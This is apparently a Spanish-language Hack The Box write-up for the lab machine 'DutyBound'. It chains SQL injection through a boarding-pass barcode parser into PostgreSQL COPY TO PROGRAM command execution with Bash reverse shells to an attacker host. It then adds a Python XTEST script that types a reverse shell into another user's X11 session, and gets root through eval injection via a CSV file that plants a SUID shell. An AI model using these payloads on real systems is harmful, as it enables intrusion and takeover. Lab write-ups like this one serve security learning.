---
created: 2026-11-6
description: DutyBound es una máquina Linux que presenta una aplicación web vulnerable a inyección SQL en su proceso de verificación de códigos de barras BCBP, lo que puede escalarse a ejecución remota de código a través de PostgreSQL. El acceso inicial implica abusar de una sesión activa de X11 para obtener acceso como otro usuario, mientras que la escalada de privilegios se consigue mediante una unidad path de systemd y una inyección en eval de Bash.
---

#htb #medium #linux #web #bar-code #bcbp #sqli #sql-error-based #postgresql #rce #x11 #openbox #systemd #eval-injection

# Enumeración
## Escaneo de puertos

```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ nmap -p- --open -vvv --min-rate 5000 -n 10.129.195.107 -oG scan
Discovered open port 443/tcp on 10.129.195.107
Discovered open port 80/tcp on 10.129.195.107
Discovered open port 22/tcp on 10.129.195.107
```

Los puertos 22, 80, 443 están abiertos.

```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ nmap -p 22,80,443 -sCV 10.129.195.107 -oN portscan.txt -Pn
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://airsnacks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Welcome \xC2\xB7 AirSnacks Self-Checkout
| ssl-cert: Subject: commonName=airsnacks.htb
```

Las aplicaciones web redirigen a `airsnacks.htb`, así que hay que añadir el dominio a `/etc/hosts`

```bash
[hvidal@fedora] ~/d/h/h/m/f/scan
❯ echo "10.129.195.107 airsnacks.htb" | sudo tee -a /etc/hosts
```

## Aplicación web

El servicio HTTP redirige todas las peticiones a HTTPS, por lo que la enumeración posterior se centrará en la aplicación HTTPS.

La aplicación HTTPS aloja una tienda online que cuenta con un escáner de códigos de barras de tarjetas de embarque.

![[barcode_scanner.png]]

Sin embargo, el escáner de códigos de barras no parece tener acceso a una cámara. Para entender cómo se comunica con el backend, intercepté su petición HTTP con Burp Suite.
```http
POST /checkout/boarding-pass/verify HTTP/1.1
Host: airsnacks.htb
Cookie: session=...
Content-Length: 12

{"raw":""}
```

El escáner estaba enviando un código de barras vacío al servidor, que respondió con el siguiente error:
```json
{
  "detail":"expected 'M' at offset 0",
  "error":"BCBP_ERR_FORMAT_CODE",
}
```

>BCBP significa *Bar Coded Boarding Pass*, un estándar definido por la International Air Transport Association ([IATA](https://www.iata.org/contentassets/1dccc9ed041b4f3bbdcf8ee8682e75c4/2021_03_02-bcbp-implementation-guide-version-7-.pdf)).

## Análisis del formato BCBP

La estructura de un BCBP válido es:

| Offset | Len | Field                             |
| ------ | --- | --------------------------------- |
| 0      | 1   | Format code                       |
| 1      | 1   | Legs                              |
| 2      | 20  | Name `LAST/FIRST`                 |
| 22     | 1   | Electronic ticket (E)             |
| 23     | 7   | PNR code                          |
| 30     | 3   | Origin                            |
| 33     | 3   | Destination                       |
| 36     | 3   | Operating carrier                 |
| 39     | 5   | Flight number                     |
| 44     | 3   | Flight date                       |
| 47     | 1   | Compartment                       |
| 48     | 4   | Seat number                       |
| 52     | 5   | Check-in sequence                 |
| 57     | 1   | Passenger status                  |
| 58     | 2   | Size of conditional section (hex) |

Tras construir una cadena BCBP de 60 caracteres y establecer el tamaño de la sección condicional en `00`, el servidor devolvió `BCBP_ERR_CONDITIONAL_REQUIRED` para el elemento 6, lo que indicaba que se requerían datos condicionales adicionales.

A continuación, establecí el tamaño de la sección condicional en `FF` y utilicé los mensajes de error posteriores para inferir la estructura esperada.

Mediante este proceso, pude reconstruir la siguiente estructura para la sección condicional:
- `item10`: uno de `0B, 18, 25, 32`.
- Document type: `B` o un carácter en blanco.
- Siete caracteres en blanco.
- Operating carrier seguido de un espacio.
- `item17`: uno de `03, 0D, 0E, 0F, 12, 15, 25, 26, 29, 2A`; estos son los espacios hasta el comienzo de la zona libre.
- Caracteres restantes: zona libre

Mi código final fue:
```txt
M1GRIFFIN/PETER       E123456 ABCDEFBA 0117 325Y024A0101 0FF>50BB       BA 03
```

Al usar ese código en una petición, el servidor devuelve una nueva cookie de sesión y un JWT.
No pude encontrar qué estaba usando el JWT, pero la cookie de sesión permitía acceder al botón de pago, aunque no proporciona ninguna funcionalidad útil.

# Explotación
## Acceso inicial

Sospeché que el servidor podría validar la tarjeta de embarque contra una base de datos, así que probé el campo del nombre del pasajero en busca de inyección SQL.
```http
POST /checkout/boarding-pass/verify HTTP/1.1
Host: airsnacks.htb
Cookie: session=...
Content-Length: 91

{"raw":"M1G'IFFIN/PETER       E123456 ABCDEFBA 0117 325Y024A0101 0FF>50BB       BA 03"}
```

El servidor devolvió un error interno que contenía un error de sintaxis de PostgreSQL, revelando que el backend utiliza una base de datos PostgreSQL.
```json
{
  "detail":"syntax error at or near \"IFFIN\"\nLINE 1: ...1b35546d', 'dutyfree-kiosk7', now(), '123456', 'G'IFFIN/PETE...\n                                                             ^\n",
  "error":"DCS_ERR_INTERNAL"
}
```

Sin embargo, el campo del nombre del pasajero está sujeto a una validación de formato estricta, lo que dificulta la inyección de sintaxis SQL. Por ello, probé a inyectar el payload en la zona libre.
```http
POST /checkout/boarding-pass/verify HTTP/1.1
Host: airsnacks.htb
Cookie: session=...
Content-Length: 91

{"raw":"M1GRIFFIN/PETER       E123456 ABCDEFBA 0117 325Y024A0101 0FF>50BB       BA 03   '"}
```

Este payload provocó un error diferente de PostgreSQL:
```json
{
  "detail":"unterminated quoted string at or near \"''')\"\nLINE 1: .../PETER', 'BA', '0117', '325', 'ABC', 'DEF', '', '', 81, ''')\n                                                                   ^\n",
  "error":"DCS_ERR_INTERNAL"
}
```

El mensaje de error revela parte de la sentencia SQL, lo que sugiere que la consulta sigue una estructura similar a:
```sql
INSERT INTO table_name (column1, column2, ...)
VALUES ('value1', 'value2', ..., 81, '<input>');
```

Dado que la entrada se concatena directamente en la sentencia SQL sin una sanitización o parametrización adecuada, se puede escapar la cadena SQL utilizando el siguiente payload:
```json
{
  "raw":"M1GRIFFIN/PETER       E123456 ABCDEFBA 0117 325Y024A0101 0FF>50BB       BA 03   '); SELECT version()::int; --"
}
```

Convertí el resultado de `version()` a entero para provocar un error de conversión en el servidor, haciendo que la versión de la base de datos se incluyera en la respuesta.
```json
{
  "detail":"invalid input syntax for type integer: \"PostgreSQL 18.6 (Ubuntu 18.6-1.pgdg22.04+2) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.3) 11.4.0, 64-bit\"\n",
  "error":"DCS_ERR_INTERNAL"
}
```

## RCE

Probé si se podía abusar de la funcionalidad `COPY ... TO PROGRAM` de PostgreSQL para ejecutar comandos del sistema operativo.

Primero, iniciar un servidor HTTP en la máquina del atacante.
```bash
[hvidal@fedora] ~/d/h/h/m/d/content
❯ python -m http.server 8000
```

Luego enviar la siguiente petición.
```json
{
  "raw":"M1GRIFFIN/PETER       E123456 ABCDEFBA 0117 325Y024A0101 0FF>50BB       BA 03   '); COPY (SELECT '') TO PROGRAM 'curl http://IP:8000'; --" 
}
```

El servidor HTTP recibe una petición GET, confirmando que la ejecución de comandos se realizó correctamente.
```txt
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.195.107 - - [05/Nov/2026 18:29:25] "GET / HTTP/1.1" 200 -
```

Tras confirmar que la inyección SQL puede escalarse a ejecución remota de código, podemos ejecutar una reverse shell para obtener acceso al objetivo.

Primero, codificar en Base64 una reverse shell de Bash.
```bash
[hvidal@fedora] ~/d/h/h/m/d/content
❯ echo "bash -i >& /dev/tcp/IP/4444 0>&1" | base64
```

Iniciar un listener en el puerto `4444`.
```bash
[hvidal@fedora] ~/d/h/h/m/d/content
❯ nc -nlvp 4444
```

Finalmente, enviar una petición con el siguiente cuerpo:
```json
{
  "raw":"M1GRIFFIN/PETER       E123456 ABCDEFBA 0117 325Y024A0101 0FF>50BB       BA 03   '); COPY (SELECT '') TO PROGRAM '/bin/bash -c \"echo <Base64 payload> | base64 -d | /bin/bash\"'; --"
}
```

Ahora tenemos una shell con el usuario `postgres`.
```txt
postgres@dutyfree-kiosk7:/var/lib/postgresql/18/main$
```

## Post-explotación

Al enumerar los procesos en ejecución, descubrí que el usuario `dutyfree-kiosk` tiene una sesión activa de X11 gestionada por `xinit`, con Firefox ejecutándose en modo kiosco en la pantalla `:0`.

```bash
postgres@dutyfree-kiosk7:/home$ ps aux | grep kiosk
ps aux | grep kiosk
dutyfre+     tty7     S+   0:00 xinit /home/dutyfree-kiosk/.xinitrc -- /usr/bin/X :0 vt7 -nolisten tcp -auth /tmp/serverauth.2kKPYtbbBC
dutyfre+    tty7   Sl   0:29 /snap/firefox/8803/usr/lib/firefox/firefox --kiosk https://airsnacks.htb
```

Luego comprobé si podía conectarme al servidor X:
```bash
postgres@dutyfree-kiosk7:/home$ DISPLAY=:0 xset q       
Keyboard Control:
  auto repeat:  on    key click percent:  0    LED mask:  00000000
Screen Saver:
  prefer blanking:  yes    allow exposures:  yes
  timeout:  600    cycle:  600
```

Dado que el comando no devolvió un error, el usuario actual puede conectarse al servidor X, así que revisé las combinaciones de teclas de Openbox.
```bash
postgres@dutyfree-kiosk7:/home$ cat /etc/xdg/openbox/rc.xml | grep term
  <keybind key="C-A-t"><action name="Execute"><command>xterm</command></action></keybind>
```

> La combinación de teclas `Ctrl + Alt + t` lanza una terminal `xterm`.

X11 proporciona una extensión llamada XTEST, que permite a los clientes X11 simular eventos de teclado y ratón.

Al usar esta extensión, podemos interactuar con la sesión gráfica activa. Dado que la sesión pertenece a `dutyfree-kiosk`, podemos simular la entrada de teclado para abrir una terminal y ejecutar comandos como ese usuario.

Utilizaré un script de Python para conectarme al servidor X y simular la entrada de teclado.

El script:
- Se conecta a la pantalla de X11.
- Simula el atajo `Ctrl + Alt + t` para abrir una terminal.
- Ejecuta un comando de reverse shell.

>[!Note]- Script
>```python
>import time
>from Xlib import X, XK, display
>from Xlib.ext import xtest
>
>x11 = display.Display()
>
>LHOST = "10.10.14.163"
>LPORT = "4433"
>
>PUNCT = {
>    ' ': 'space', '/': 'slash', '.': 'period', '_': 'underscore',
>    '>': 'greater', '<': 'less', '-': 'minus', ':': 'colon',
>    ';': 'semicolon', '=': 'equal', '+': 'plus', '*': 'asterisk',
>    '&': 'ampersand', '|': 'bar', "'": 'apostrophe', '"': 'quotedbl',
>    '$': 'dollar', '%': 'percent', '^': 'asciicircum', '~': 'asciitilde',
>    '\\': 'backslash', '!': 'exclam', '@': 'at', '#': 'numbersign',
>    '(': 'parenleft', ')': 'parenright', '{': 'braceleft', '}': 'braceright',
>    '?': 'question', ',': 'comma',
>}
>
>def get_key_sym(ch):
>    if ch in PUNCT:
>        return XK.string_to_keysym(PUNCT[ch])
>    return XK.string_to_keysym(ch)
>
>def get_key_code(name):
>    keysym = XK.string_to_keysym(name)
>
>    return x11.keysym_to_keycode(keysym)
>
>def key_event(key, event):
>    xtest.fake_input(x11, event, key)
>    x11.sync()
>
>def shortcut(*keys):
>    codes = [get_key_code(n) for n in keys]
>    for key in codes:
>        key_event(key, X.KeyPress)
>
>    time.sleep(0.1)
>    for key in reversed(codes):
>        key_event(key, X.KeyRelease)
>
>def write_text(text):
>    shift_chars = set('!@#$%^&*()_+{}|:"<>?~')
>    for char in text:
>        if char == "\n":
>            key = get_key_code("Return")
>        else:
>            ks = get_key_sym(char)
>            key = x11.keysym_to_keycode(ks)
>
>        if not key:
>            return
>
>        needs_shift = char.isupper() or char in shift_chars
>        if needs_shift:
>            shift_kc = get_key_code("Shift_L")
>            key_event(shift_kc, X.KeyPress)
>
>        key_event(key, X.KeyPress)
>        key_event(key, X.KeyRelease)
>
>        if needs_shift:
>            key_event(shift_kc, X.KeyRelease)
>
>        time.sleep(0.03)
>
>
>if __name__ == "__main__":
>    shortcut("Control_L", "Alt_L", "t")
>    time.sleep(2)
>    payload = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\n"
>    try:
>        write_text(f"{payload}")
>    finally:
>        x11.close()
>        print("Done")
>```

Primero, iniciar un listener.
```bash
[hvidal@fedora] ~/.ssh
❯ nc -nlvp 4433
```

Establecer `LHOST` y `LPORT` con la dirección IP del atacante y el puerto de escucha, y luego ejecutar el script en el objetivo.
```bash
DISPLAY=:0 python3 keys.py
```

Ahora tenemos una nueva shell como `dutyfree-kiosk` y podemos leer la flag de usuario.
```bash
dutyfree-kiosk@dutyfree-kiosk7:~$ cat user.txt
```

# Escalada de privilegios

## Enumeración

Primero, busqué archivos escribibles por el usuario actual.
```bash
dutyfree-kiosk@dutyfree-kiosk7:~$ find / -writable 2>/dev/null | grep -v "sys\|proc\|snap\|var\|run\|dev\|tmp"
 /home/dutyfree-kiosk/.Xauthority
/opt/vrs/data
/opt/vrs/data/duty-rates.csv
```

Encontré un archivo escribible inusual en `/opt/vrs/data/duty-rates.csv`, así que investigué qué proceso lo estaba utilizando.

Descubrí un servicio de systemd llamado `vrs-duty-apply.service`, que ejecuta el script mencionado anteriormente como root.
```bash
dutyfree-kiosk@dutyfree-kiosk7:~$ cat /etc/systemd/system/vrs-duty-apply.service
[Service]
Type=oneshot
ExecStart=/opt/vrs/bin/apply-duty-rates.sh
```

Este servicio es activado por `vrs-duty-apply.path`, una unidad path de systemd que monitoriza `/opt/vrs/data/duty-rates.csv` e inicia el servicio cada vez que se modifica el archivo.
```bash
dutyfree-kiosk@dutyfree-kiosk7:~$ cat /etc/systemd/system/vrs-duty-apply.path
[Path]
PathModified=/opt/vrs/data/duty-rates.csv
Unit=vrs-duty-apply.service
```

El script procesa el archivo CSV línea por línea, utilizando comas como delimitadores de campos. Cada fila sigue este formato:
```csv
tax_class(str),duty_pct(int),vat_pct(int)
```

Valida que los campos existan y que `duty_pct` y `vat_pct` sean números, y luego ejecuta `eval "${tax_class}=${duty_pct}"`.

>`eval` ejecuta los argumentos como bash.

La vulnerabilidad reside en el uso de `eval` con el valor no confiable de `tax_class`. Dado que este campo no se valida adecuadamente, un atacante puede inyectar comandos de shell arbitrarios en la expresión pasada a `eval`, logrando potencialmente la ejecución de comandos con los privilegios del proceso que ejecuta el script.

>[!Note]- Fragmentos de código relevantes
>
>```bash
>RATES="/opt/vrs/data/duty-rates.csv"    # CSV file to process
>
>lineno=0
># Read the CSV line by line
>while IFS=, read -r tax_class duty_pct vat_pct; do   
>    (( ++lineno ))
>
>	# duty_pct and vat_pct have to be numbers
>	if ! [[ "$duty_pct" =~ ^[0-9]+$ && "$vat_pct" =~ ^[0-9]+$ ]]; then
>		exit 1
>	
>	eval "${tax_class}=${duty_pct}"   # tax_class is not validated
>...
>```

## Explotación

El objetivo es modificar el archivo CSV insertando un payload en la primera columna que nos permita ejecutar comandos como root.

El siguiente payload copia `/bin/bash` a `/tmp` y establece el bit SUID en el binario resultante:
```csv
cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash #,45,20
```

Cuando el servicio procese el archivo, podremos ejecutar la copia de `/bin/bash` para obtener una shell de root.
```bash
dutyfree-kiosk@dutyfree-kiosk7:$ /tmp/rootbash -p
```

Ahora podemos leer la flag:
```bash
rootbash-5.1$ cat root.txt
```